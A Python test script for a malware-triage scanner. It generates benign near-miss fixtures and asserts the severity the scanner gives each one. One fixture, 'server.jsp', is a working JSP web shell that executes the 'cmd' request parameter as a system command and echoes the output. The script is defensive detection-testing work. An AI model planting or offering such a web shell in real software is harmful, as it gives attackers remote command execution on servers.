#!/usr/bin/env python3
"""Generate inert fixtures and check behavior without running their code."""
import importlib.util,io,json,pathlib,subprocess,tempfile,zipfile,sys
root=pathlib.Path(__file__).resolve().parents[2]
spec=importlib.util.spec_from_file_location('builder',root/'scripts/fixture-builders/java-class-triage.py');b=importlib.util.module_from_spec(spec);spec.loader.exec_module(b)
load_imports=[('java/net/HttpURLConnection','getInputStream','()Ljava/io/InputStream;'),('java/nio/file/Files','readAllBytes','()V'),('javax/crypto/spec/SecretKeySpec','<init>','()V'),('javax/crypto/Cipher','doFinal','()V'),('java/nio/file/Files','write','()V'),('java/lang/Class','forName','()V'),('java/lang/reflect/Constructor','newInstance','()V'),('java/net/InetAddress','getHostName','()V')]
rows=b''.join(f'{i:06X}Vendor\u200bName\n'.encode() for i in range(40))
controls=[
 ('notable','mac-table.txt',rows),
 ('notable','mac-mixed-encoding.txt',rows.replace(b'000000Vendor',b'000000Vend\xc3\xd8or')),
 ('suspicious','table-plus-prose.txt',rows+b'\npay\xe2\x80\x8bpal\n'),
 ('suspicious','mac-vendors.txt',b'Account pay\xe2\x80\x8bpal confirmation\n'),
 ('notable','factory.groovy',b'def script = "1+2"\nnew GroovyShell().evaluate(script)\n'),
 ('notable','expression.groovy',b"def answer = Eval.me('1+2')\n"),
 ('notable','nano-help.class',b.classfile('RenamedHelp',strings=['Suspend nano using the system suspend keystroke.'])),
 ('notable','allpermission.class',b.classfile('RenamedWrapper',strings=['java.security.AllPermission'])),
 ('notable','python-runtime.class',b.classfile('RenamedInterop',strings=['python3'],imports=[('java/lang/ProcessBuilder','start','()V')])),
 ('notable','multi-interpreter.class',b.classfile('RenamedBuildInterop',strings=['python3','bash -c'],imports=[('java/lang/ProcessBuilder','start','()V')])),
 ('notable','single-class-loader.class',b.classfile('RenamedLoader',imports=load_imports)),
 ('suspicious','repeated-dialogs.vbs',b'\n'.join([b'MsgBox("placeholder")']*40)+b'\n'),
 ('notable','gui-library.lua',b'#!/usr/bin/env lua\n-- GUI library examples\nlocal widgets = require("widgets")\nlocal function show(s) return widgets.msgbox(s) end\n' +b'\n'.join([b'msgbox("ordinary UI example")']*40)+b'\n'),
 ('notable','api-index.txt',(b'java.util.List<? extends java.lang.Number>#get(int;)\n'*2000)),
 ('hostile','server.jsp',b'<%@ page import="java.util.*,java.io.*" %>\n<% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String line = dis.readLine(); while(line != null) { out.println(line); line=dis.readLine(); } } %>'),
]
out=io.BytesIO()
with zipfile.ZipFile(out,'w') as z:
 for i,imp in enumerate(load_imports):z.writestr(f'renamed/Part{i}.class',b.classfile(f'renamed/Part{i}',imports=[imp]))
controls.append(('notable','unrelated-loader-APIs.jar',out.getvalue()))
import argparse,lzma
parser=argparse.ArgumentParser(description='Check JVM-good triage without executing fixture code')
parser.add_argument('--cleave',default=str(root.parent/'cleave/target/release/cleave'))
parser.add_argument('--write-fixtures',action='store_true')
args=parser.parse_args()
cleave=args.cleave
if args.write_fixtures:
 for level,name,data in controls:
  target=root/'testdata'/level/'generated/java-class-good-triage'/name
  target.parent.mkdir(parents=True,exist_ok=True)
  if len(data)>20*1024:target=target.with_name(target.name+'.xz');data=lzma.compress(data)
  target.write_bytes(data)

with tempfile.TemporaryDirectory(prefix='jvm-good-controls-') as wd:
 for level,name,data in controls:(pathlib.Path(wd)/name).write_bytes(data)
 r=subprocess.run([cleave,'--traits-dir',str(root),'--format=jsonl',wd],capture_output=True,text=True)
 if r.returncode:raise RuntimeError(r.stderr)
 found={}
 for line in r.stdout.split('\n'):
  try:f=json.loads(line)['files'][0]
  except (ValueError,KeyError,IndexError,TypeError):continue
  found[pathlib.Path(f['path']).name]=f
 assert len(found)==len(controls),(found.keys(),len(controls))
 for expected,name,_ in controls:
  f=found[name];traits=f.get('traits',[]);highest=max([t['crit'] for t in traits]+[0]);bounds={'notable':(0,3),'suspicious':(4,4),'hostile':(5,5)}
  assert bounds[expected][0]<=highest<=bounds[expected][1],(name,expected,f.get("type"),highest,traits)
  assert all(t['id']!='credential/keylogger' for t in traits),name
  assert all(t['id']!='objectives/execution/interpreter/eval/dynamic::groovy-dynamic-evaluate' for t in traits),name
  if name=='api-index.txt':assert f['type']!='php',f
 for name in ['mac-table.txt','mac-mixed-encoding.txt']:
  assert any(t['id']=='metadata/file/line::hex-prefix-label-records' for t in found[name]['traits']),name
 assert any(t['id']=='metadata/lang/natural/vocabulary/keyboard::jvm-keystroke-text' for t in found['nano-help.class']['traits'])
print('PASS:',len(controls),'JVM-good controls, including mixed encodings, renamed helpers, unrelated archive members, and hostile near misses')
